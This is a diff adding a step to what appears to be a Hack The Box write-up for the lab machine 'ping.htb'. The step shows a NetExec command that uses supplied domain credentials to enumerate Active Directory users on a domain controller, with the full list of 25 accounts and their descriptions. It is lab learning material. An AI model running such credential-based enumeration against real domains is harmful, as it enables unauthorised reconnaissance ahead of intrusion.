@@ -124,3 +124,38 @@ SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:Assum
 
 The creds work on the domain!
 
+```python
+❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k --users
+SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:AssumedBreach123 
+SMB         dc1.ping.htb    445    dc1              -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         dc1.ping.htb    445    dc1              Administrator                 2026-02-03 09:42:36 0       Built-in account for administering the computer/domain 
+SMB         dc1.ping.htb    445    dc1              Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         dc1.ping.htb    445    dc1              krbtgt                        2025-06-16 11:36:47 0       Key Distribution Center Service Account 
+SMB         dc1.ping.htb    445    dc1              M.Russell                     2025-12-28 08:14:51 0       IT manager 
+SMB         dc1.ping.htb    445    dc1              G.Lorents                     2025-12-28 08:14:51 0       IT Support Specialist 
+SMB         dc1.ping.htb    445    dc1              Z.Iskam                       2025-12-28 08:14:51 0       IT Director 
+SMB         dc1.ping.htb    445    dc1              M.Wallace                     2025-12-28 08:14:51 0       Assurance Tester 
+SMB         dc1.ping.htb    445    dc1              P.Paul                        2025-12-28 08:14:52 0       Security Specialist 
+SMB         dc1.ping.htb    445    dc1              A.Gordon                      2025-12-28 08:14:52 0       Network Engineer 
+SMB         dc1.ping.htb    445    dc1              P.Klain                       2025-12-28 08:14:52 0       Senior IT Technician 
+SMB         dc1.ping.htb    445    dc1              C.Roberts                     2025-12-28 08:14:52 0       Junior IT Technician 
+SMB         dc1.ping.htb    445    dc1              S.Zhoski                      2026-01-17 14:42:20 0        
+SMB         dc1.ping.htb    445    dc1              R.Miller                      2026-01-17 14:42:20 0        
+SMB         dc1.ping.htb    445    dc1              A.Adam                        2026-01-17 14:42:20 0        
+SMB         dc1.ping.htb    445    dc1              R.Robins                      2026-01-17 14:42:20 0        
+SMB         dc1.ping.htb    445    dc1              P.Pollek                      2026-01-17 14:42:20 0        
+SMB         dc1.ping.htb    445    dc1              O.Plinski                     2026-01-17 14:42:20 0        
+SMB         dc1.ping.htb    445    dc1              V.Vodomir                     2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              D.MacKenzie                   2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              P.Vandeval                    2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              T.Yang                        2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              N.Neri                        2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              W.Williams                    2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              K.Podroski                    2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              G.James                       2026-01-17 14:42:21 0        
+SMB         dc1.ping.htb    445    dc1              [*] Enumerated 25 local users: PING
+```
+
+Ill get the users and the user account descriptions
+
